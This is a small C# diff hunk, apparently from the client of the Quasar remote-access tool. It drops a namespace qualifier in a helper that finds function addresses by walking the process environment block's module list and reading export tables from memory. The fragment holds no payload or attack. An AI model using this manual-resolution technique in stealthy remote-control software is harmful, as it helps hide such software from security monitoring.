@@ -252,9 +252,9 @@ namespace Quasar.Client.Utilities
             if (!addresses.TryGetValue(key, out var addr))
             {
                 var peb = EnvironmentBlockInfo.GetPeb();
-                var ldrData = KernelStructOffset._PEB_LDR_DATA.Create(peb.Ldr);
+                var ldrData = _PEB_LDR_DATA.Create(peb.Ldr);
                 var mod = ldrData.Find(module);
-                if (object.Equals(mod, default(KernelStructOffset._LDR_DATA_TABLE_ENTRY)))
+                if (object.Equals(mod, default(_LDR_DATA_TABLE_ENTRY)))
                     Environment.FailFast("Inexistent module: " + module);
                 var img = PEImage.ReadFromMemory(mod.DllBase, (int)mod.SizeOfImage);
                 var procStr = img.GetExportFunction(proc);
